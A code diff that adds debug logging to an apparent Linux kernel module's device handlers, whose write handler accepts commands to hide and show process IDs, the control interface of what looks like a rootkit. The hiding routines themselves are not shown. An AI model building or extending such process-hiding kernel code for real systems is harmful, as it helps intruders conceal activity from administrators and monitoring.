@@ -99,6 +99,8 @@ int dev_open(struct inode* p_inode, struct file* p_file)
 {
     module_dev_t* p_dev;   /* device information */
 
+    KLOG_DEBUG(LOG_PREFIX "device::dev_read: open device");
+
     p_dev = container_of(p_inode->i_cdev, module_dev_t, cdev);
     p_file->private_data = p_dev;   /* for other methods */
 
@@ -115,11 +117,13 @@ int dev_open(struct inode* p_inode, struct file* p_file)
 
 ssize_t dev_read(struct file* p_file, char __user* p_buf, size_t count, loff_t* p_f_pos)
 {
+    KLOG_DEBUG(LOG_PREFIX "device::dev_read: read from device");
     return 0;
 }
 
 int dev_release(struct inode* p_inode, struct file* p_file)
 {
+    KLOG_DEBUG(LOG_PREFIX "device::dev_read: release device");
     return 0;
 }
 
@@ -133,6 +137,8 @@ ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, l
     unsigned long arg = 0;
     int rc = 0;
 
+    KLOG_DEBUG(LOG_PREFIX "device::dev_read: write to device");
+
     if ((count > MAX_BUF_SIZE - 1) || (count < 14)) {
         return -EFAULT;
     }
@@ -141,19 +147,23 @@ ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, l
 
     p_dev = p_file->private_data;
     if (copy_from_user(buffer, p_buf, count)) {
+        KLOG_DEBUG(LOG_PREFIX "device::dev_read: failed to copy from user");
 		return -EFAULT;
 	}
 
     rc = ioc_parse_cmd(buffer, count, &cmd, &arg);
     if (rc != 0) {
+        KLOG_DEBUG(LOG_PREFIX "device::dev_read: failed to parse command; reason %ld", rc);
         return rc;
     }
 
     if (cmd & CROC_IOC_PID) {
         if (cmd & CROC_IOC_HIDE_CMD) {
             rc = ioc_hide_pid(p_dev, arg);
+            KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been hidden with result %d", arg, rc);
         } else if (cmd & CROC_IOC_SHOW_CMD) {
             rc = ioc_show_pid(p_dev, arg);
+            KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been showed with result %d", arg, rc);
         } else {
             return -EFAULT;
         }
@@ -161,10 +171,12 @@ ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, l
         /* @todo    Implement */
     } else if (cmd & CROC_IOC_LOG) {
         SET_LOGF_LEVEL(arg);
+        KLOG_DEBUG(LOG_PREFIX "device::dev_read: setted log level %ld", arg);
     } else {
         return -EFAULT;
     }
 
+    KLOG_DEBUG(LOG_PREFIX "device::dev_read: finished with return code %d", rc);
     return rc;
 }
 
